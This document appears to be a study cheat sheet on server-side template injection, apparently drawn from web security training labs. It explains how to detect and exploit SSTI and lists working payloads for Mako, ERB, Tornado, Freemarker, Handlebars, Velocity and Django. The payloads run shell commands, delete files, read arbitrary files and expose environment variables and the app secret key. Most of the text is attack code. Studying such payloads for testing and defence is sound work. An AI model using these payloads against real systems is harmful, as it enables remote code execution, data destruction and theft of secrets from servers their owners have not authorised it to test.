# Server-side template injection
SSTI is when an attacker is able to use template syntax to inject malicious code into ttemplate which is executed on server.  
Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.  
Statically generated templates aren't vulnerable:
```
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
```
But dynamically generated are vulnerable:
```
$output = $twig->render("Dear " . $_GET['name']);
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
SSTI are hard to detect, but easy to exploit.  
Fuzz `${{<%[%'"}}%\`  
If exception occurs, that means such syntax is interpreted by a server in some way.  
```
http://vulnerable-website.com/?username=${7*7}
```
If mathematical operations are executed, it's a vuln!  
Also sometimes we need to break out from template:
```
http://vulnerable-website.com/?greeting=data.username}}<tag>
```
After detecting SSTI we need to define what template engine is used by using different paylaods and examining responses.  
After dedtecting tempalte engine, read docs and learn basic template syntax.  
Example for Mako template engine:
```
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```
Example for ERB (Ruby) template:
```
url?q=<%= 7*7 %>
<%= system("whoami") %>
```
Example for Tornado:
```
user.nickname}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```
Also read 'Security' section of documentations of template engines.  
Read files in ERB:
```
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```
Freemarker example (Java):
```
<p>${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}</p>
```
RCE for handlebars:
```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```
## Explore
If we can't create exploit, we need to explore environment  
Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. If such an object exists, you can potentially use it to generate a list of objects that are in scope. For example, in Java-based templating languages, you can sometimes list all variables in the environment using the following injection: 
```
${T(java.lang.System).getenv()}
```
Also we need investigate not only template-provided objects, but specific user-provided.  
For django:
```
{% debug %}
if settings object is accessible, we can steal app secret key:
{{% settings.SECRET_KEY %}}
```
## Constructing custom exploit
Firstly, we need investigate objects and functions to which we have access.  
From documentation we can investigate interesting objects and they methods, that could be combined to obtain high-privileged access  
For eexamplein Velocity(java) we have access to a `ClassTool` object called `$class`. From docs we can investigate that we can chain the `$class.inspect()` method and `$class.type` property to obtain references to arbitrary objects.  
```
$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")
```
For Freemarker:
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
